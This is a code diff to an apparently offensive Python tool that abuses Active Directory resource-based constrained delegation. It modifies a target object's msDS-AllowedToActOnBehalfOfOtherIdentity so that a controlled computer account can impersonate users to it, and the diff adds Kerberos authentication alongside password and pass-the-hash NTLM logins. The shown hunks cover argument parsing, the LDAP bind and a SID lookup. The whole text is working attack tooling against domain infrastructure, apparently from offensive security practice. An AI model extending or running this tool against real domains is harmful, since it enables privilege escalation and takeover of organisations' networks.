@@ -1,14 +1,15 @@
 #!/usr/bin/env python3
-from ldap3 import ALL, Server, Connection, MODIFY_REPLACE, NTLM, MODIFY_DELETE
+from ldap3 import ALL, Server, Connection, MODIFY_REPLACE, NTLM, MODIFY_DELETE, SASL, KERBEROS
 from binascii import unhexlify
 from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR
 import argparse
 
 parser = argparse.ArgumentParser(description='Set SD for controlled computer object to a target object for RBCD')
-parser.add_argument('-u','--username',  help='username for LDAP', required=True)
-group = parser.add_mutually_exclusive_group()
+parser.add_argument('-u','--username',  help='username for LDAP', required=False)
+group = parser.add_mutually_exclusive_group(required=True)
 group.add_argument('-p','--password',  help='password for LDAP')
 group.add_argument('-H','--hash',  help='LM:NT hash for LDAP')
+group.add_argument('-k', '--kerberos', help='Kerberos Auth GSSAPI',action='store_true')
 parser.add_argument('-d','--domain',  help='LDAP server/domain', required=True)
 parser.add_argument('-t','--targetDn',  help='Target distinguishedName (Example: "CN=DC1,OU=Domain Controllers,DC=lab,DC=local")', required=True)
 parser.add_argument('-c','--contrDn', help='Controlled computer distingushedName to add to msDS-AllowedToActOnBehalfOfOtherIdentity attribute', required=True)
@@ -27,8 +28,14 @@ def main():
     s = Server(server, get_info=ALL)
     if (args.password):
         conn = Connection(s, user=username, password=args.password, authentication=NTLM, auto_bind=True)
-    else:
+    elif (args.hash):
         conn = Connection(s, user=username, password=args.hash, authentication=NTLM, auto_bind=True)
+    elif (args.kerberos):
+        if not (args.ldapserver):
+            print("Error: Specify DC for ldapserver argument")
+            exit()
+        else:
+            conn = Connection(s, sasl_credentials=(args.ldapserver,), authentication=SASL, sasl_mechanism=KERBEROS, auto_bind=True)
 
     conn.search(args.contrDn,"(objectClass=Computer)",attributes=['objectSID'])
     contrSid = conn.entries[0]['objectSID'].raw_values[0]
